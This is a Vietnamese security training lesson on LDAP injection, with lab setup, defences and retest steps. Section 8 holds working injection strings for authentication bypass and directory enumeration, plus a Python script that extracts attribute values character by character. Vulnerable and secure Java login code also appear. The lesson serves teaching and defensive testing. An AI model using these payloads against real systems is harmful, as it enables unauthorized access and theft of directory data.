---
schema_version: 1
id: WEB-A05-LDAP-INJECTION
title: "LDAP Injection"
slug: ldap-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-90
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# LDAP Injection

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích LDAP Injection bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Hãy tưởng tượng LDAP giống như cuốn sổ địa bạ khổng lồ của một tập đoàn lớn, nơi lưu trữ tất cả thông tin về nhân viên, phòng ban, máy tính và quyền truy cập của họ. Để tìm kiếm thông tin trong cuốn sổ này, hệ thống sử dụng các bộ lọc tìm kiếm (search filters) với các ký tự logic đặc biệt như dấu `&` (và), `|` (hoặc), hay `*` (đại diện cho mọi ký tự). Thông thường, khi một nhân viên đăng nhập, ứng dụng sẽ dùng bộ lọc này để đối chiếu tên đăng nhập và mật khẩu xem có trùng khớp với dữ liệu trong sổ hay không.

```
# LDAP Filter Syntax - Basic operations
(attribute=value)           # Equality match
(attribute=val*)            # Substring/wildcard match
(&(filter1)(filter2))       # AND - both must match
(|(filter1)(filter2))       # OR - either can match
(!(filter))                 # NOT - negation
(attribute>=value)          # Greater or equal
(attribute<=value)          # Less or equal
(attribute=*)               # Presence - attribute exists
```

```java
// Normal LDAP authentication in Java
import javax.naming.directory.*;

public boolean authenticate(String username, String password) {
    // Build LDAP search filter to find the user
    String filter = "(&(uid=" + username + ")(objectClass=person))";

    // Search in the directory
    SearchControls controls = new SearchControls();
    controls.setSearchScope(SearchControls.SUBTREE_SCOPE);

    NamingEnumeration<?> results = ctx.search(
        "dc=company,dc=com",  // Base DN (Distinguished Name)
        filter,                // Search filter
        controls
    );

    if (results.hasMore()) {
        // Attempt to bind (authenticate) with the found DN and password
        String userDN = results.next().getNameInNamespace();
        return ldapBind(userDN, password);  // Verify password via LDAP bind
    }
    return false;
}
```

Directory Information Tree (DIT) có cấu trúc phân cấp: `dc=company,dc=com` → `ou=People` → `cn=John Doe`. Mỗi entry có các attributes như `uid`, `cn`, `mail`, `userPassword`, `memberOf`.

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng LDAP Injection xảy ra khi ứng dụng web nối chuỗi trực tiếp tên đăng nhập do người dùng nhập vào câu lệnh truy vấn LDAP mà không hề làm sạch các ký tự đặc biệt. Kẻ tấn công có thể nhập vào những tên đăng nhập kỳ lạ chứa các ký tự như `*` hoặc đóng mở ngoặc đơn để thay đổi hoàn toàn ý nghĩa của câu lệnh tìm kiếm ban đầu. Ví dụ, thay vì kiểm tra đúng mật khẩu, câu lệnh bị biến đổi thành "tìm bất kỳ ai có tên là admin mà không cần quan tâm mật khẩu". Hậu quả là kẻ xấu có thể đăng nhập trái phép vào tài khoản của người khác, truy cập trái phép vào các dữ liệu nhân sự nhạy cảm trong hệ thống, hoặc rò rỉ toàn bộ danh bạ nội bộ của doanh nghiệp.

> **Gate kỹ thuật:** các nguồn cần được đối chiếu trực tiếp cho từng claim trước khi đổi `content_status` sang `verified`: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** directory entry và kết quả authentication/search.
- **Actor, xác thực và role:** anonymous gọi login/search; không có directory role.
- **Điều kiện khai thác:** input chưa escape bị nối vào LDAP filter và thay đổi cây predicate.
- **Browser, proxy, framework và phiên bản:** OpenLDAP 2.6 và Python 3.12 ldap3 trên loopback; không cần browser; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với ldap injection, input chưa escape bị nối vào LDAP filter và thay đổi cây predicate. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy OpenLDAP 2.6 và Python 3.12 ldap3 trên loopback; không cần browser; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case ldap injection; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “input chưa escape bị nối vào LDAP filter và thay đổi cây predicate”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của ldap injection; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây được giữ để technical review. `static-verified` chỉ xác nhận cấu trúc/annotation đã qua gate tĩnh; nó **không** chứng minh payload hoạt động trên mọi phiên bản. Trước khi chạy phải đối chiếu `context`, điều kiện cần, encoding, expected result và risk. Payload mở rộng thuộc `cheatsheets/`; lesson chỉ giữ ví dụ cốt lõi.

### 1. Authentication Bypass

<!-- payload-id: WEB-A05-LDAP-INJECTION-001 -->
<!-- context: OpenLDAP 2.6 login fixture concatenates username/password into an RFC 4515 filter -->
<!-- prerequisites: directory contains only fixture-user entries; one request; anonymous bind limited to lab subtree -->
<!-- encoding: asterisk is sent as literal UTF-8 form data and reaches the filter unescaped -->
<!-- expected-result: vulnerable filter matches the designated fixture entry; escaped filter treats * literally and returns no login -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Original filter built by application:
(&(uid=USERNAME)(userPassword=PASSWORD))

# Attack: inject wildcard into username field
Username: *
Password: *

# Resulting filter:
(&(uid=*)(userPassword=*))
# Matches ANY user with ANY password → returns first user (usually admin)
```

<!-- payload-id: WEB-A05-LDAP-INJECTION-002 -->
<!-- context: OpenLDAP 2.6 filter string with username inserted inside an AND expression -->
<!-- prerequisites: synthetic fixture-admin entry whose DN is uid=fixture-admin,ou=People,dc=lab,dc=test; one request; no production directory or privileged bind -->
<!-- encoding: parentheses and asterisk are literal UTF-8 input; HTTP form layer percent-encodes them once -->
<!-- expected-result: vulnerable parsed filter differs from baseline and matches fixture-admin; filter builder rejects/escapes input -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Attack: Close the filter early and add always-true condition
Username: fixture-admin)(|(uid=*
Password: anything

# Resulting filter:
(&(uid=fixture-admin)(|(uid=*)(userPassword=anything)))
# The OR condition (uid=*) is always true → bypasses password check
```

### 2. Data Extraction via Blind LDAP Injection

<!-- payload-id: WEB-A05-LDAP-INJECTION-003 -->
<!-- context: Python 3.12; loopback-only LDAP fixture with synthetic mail attribute -->
<!-- prerequisites: fixture bound to loopback; maximum 32 characters and 1,280 requests -->
<!-- encoding: requests form-encodes UTF-8 username patterns; LDAP metacharacters are intentionally unescaped only in vulnerable fixture -->
<!-- expected-result: recover at most 32 characters from the fixture attribute, then stop -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Extract attribute values character by character using wildcards
import requests
import string

url = "http://127.0.0.1:8080/login"
charset = string.ascii_lowercase + string.digits + "@._-"
max_length = 32
max_requests = max_length * len(charset)
request_count = 0

# Extract the public fixture user's lab mail marker
extracted = ""
for _ in range(max_length):
    found = False
    for c in charset:
        if request_count >= max_requests:
            break
        request_count += 1
        # Inject into username field to probe mail attribute
        payload = f"fixture-admin)(mail={extracted}{c}*"
        r = requests.post(url, data={
            "username": payload,
            "password": "anything)(|(uid=*"
        })
        if "Welcome" in r.text:  # Successful login indicates match
            extracted += c
            print(f"Found: {extracted}")
            found = True
            break
    if not found or request_count >= max_requests:
        break

print(f"Fixture mail marker: {extracted}")
```

### 3. Directory Enumeration

<!-- payload-id: WEB-A05-LDAP-INJECTION-004 -->
<!-- context: bounded prefix and group-membership probes against the synthetic OpenLDAP subtree -->
<!-- prerequisites: fixture usernames/groups only; maximum 16 prefix cases and one group case; no privileged bind -->
<!-- encoding: RFC 4515 metacharacters are form-encoded once; DN is cn=Lab Admins,ou=Groups,dc=lab,dc=test -->
<!-- expected-result: response difference reveals only the documented fixture username/group; escaped filter returns no wildcard match -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Enumerate valid usernames using wildcard injection
Username: a*        → 200 OK (users starting with 'a' exist)
Username: fixture-*       → 200 OK
Username: fixture-admin*  → 200 OK
Username: fixture-adminx* → 401 Fail
# Confirmed synthetic username: fixture-admin

# Enumerate group membership
Username: *)(memberOf=cn=Lab Admins,ou=Groups,dc=lab,dc=test
# Filter uses only the documented Lab Admins DN in the synthetic subtree.
```

### 4. OR-based Injection to Dump Users

<!-- payload-id: WEB-A05-LDAP-INJECTION-005 -->
<!-- context: OpenLDAP 2.6 login filter receives an injected OR/objectClass branch -->
<!-- prerequisites: directory contains three public fixture entries; one request; result count is logged but records are not returned -->
<!-- encoding: parentheses and asterisk are UTF-8 form data, percent-encoded once by the client -->
<!-- expected-result: vulnerable query count becomes three; fixed filter builder treats the input literally and returns zero -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Inject OR condition to return multiple entries
Username: *)(|(objectClass=*
Password: anything

# Resulting filter:
(&(uid=*)(|(objectClass=*)(userPassword=anything)))
# Returns ALL entries in the directory tree
```

## 9. Code dễ bị lỗi và code an toàn

```java
// ❌ VULNERABLE: String concatenation in LDAP filter
public boolean login(String username, String password) {
    // User input directly concatenated into filter - LDAP injection!
    String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";

    NamingEnumeration<?> results = ctx.search(
        "ou=People,dc=company,dc=com", filter, controls
    );
    return results.hasMore();
}
```

```java
// ✅ SECURE: Escaped input + bind authentication
public boolean login(String username, String password) {
    // Step 1: Sanitize input - escape LDAP special characters
    String safeUsername = escapeLdapFilter(username);

    // Step 2: Validate format - only alphanumeric and limited chars
    if (!safeUsername.matches("[a-zA-Z0-9._-]{1,64}")) {
        return false;
    }

    // Step 3: Search for user DN only (no password in filter)
    String filter = "(uid=" + safeUsername + ")";
    NamingEnumeration<?> results = ctx.search(
        "ou=People,dc=company,dc=com", filter, controls
    );

    if (!results.hasMore()) return false;

    // Step 4: Authenticate via LDAP bind (server validates password)
    String userDN = results.next().getNameInNamespace();
    try {
        Hashtable<String, String> bindEnv = new Hashtable<>();
        bindEnv.put(Context.SECURITY_PRINCIPAL, userDN);
        bindEnv.put(Context.SECURITY_CREDENTIALS, password);
        new InitialDirContext(bindEnv);  // Bind succeeds = valid password
        return true;
    } catch (AuthenticationException e) {
        return false;  // Invalid password
    }
}

// LDAP special character escaping per RFC 4515
public static String escapeLdapFilter(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\': sb.append("\\5c"); break;
            case '*':  sb.append("\\2a"); break;
            case '(':  sb.append("\\28"); break;
            case ')':  sb.append("\\29"); break;
            case '\0': sb.append("\\00"); break;
            default:   sb.append(c);
        }
    }
    return sb.toString();
}
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Escape theo RFC 4515 hoặc dùng filter builder với thuộc tính cố định; không nối chuỗi filter.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Mã hóa các ký tự đặc biệt trong bộ lọc LDAP và sử dụng các câu lệnh truy vấn có tham số hóa.
- **Các bước chi tiết**:
  - Escape LDAP special characters: Thay thế `*`, `(`, `)`, `\`, `NUL` bằng escaped form (`\2a`, `\28`, `\29`, `\5c`, `\00`).
  - Dùng parameterized LDAP queries: Sử dụng framework LDAP API với bind parameters.
  - Input validation: Áp identity policy cho username và escape theo RFC 4515 nếu username đi vào filter; không giới hạn bảng ký tự password để chữa injection, vì password phải được truyền làm LDAP bind credential chứ không ghép vào filter.
  - Bind authentication: Xác thực bằng LDAP bind thay vì so sánh password trong filter.
  - Least privilege: LDAP service account chỉ có quyền đọc các attributes cần thiết.
  - Rate limiting và account lockout: Ngăn chặn các cuộc tấn công dò quét tự động.

## 12. Retest

- **Positive case:** luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Regression:** lưu testcase tối thiểu tái hiện lỗi cũ và testcase chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Đánh dấu `verified` dù nguồn, phiên bản fixture hoặc evidence payload chưa được lưu.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **LDAP**: Giao thức truy cập thư mục hạng nhẹ dùng để quản lý thông tin nhân viên, tài nguyên doanh nghiệp.
- **LDAP Injection**: Chèn câu lệnh LDAP trái phép để thay đổi logic tìm kiếm thư mục.
- **Search Filter**: Chuỗi ký tự định nghĩa quy luật tìm kiếm trong cơ sở dữ liệu LDAP.
- **Wildcard**: Ký tự đại diện (thường là `*`) khớp với mọi chuỗi ký tự.
- **DN (Distinguished Name)**: Tên gọi duy nhất đại diện cho một bản ghi trong sơ đồ cây LDAP.

## 16. Bài liên quan và đọc thêm

- [SQL Injection](../sql-injection/) — Lỗ hổng chèn câu lệnh truy vấn cơ sở dữ liệu.

## 17. Tài liệu tham khảo

- **[S1]** OWASP WSTG – LDAP Injection. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** HackTricks – LDAP Injection. https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE-90. https://cwe.mitre.org/data/definitions/90.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** RFC 4515 – LDAP Search Filters. https://datatracker.ietf.org/doc/html/rfc4515 — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
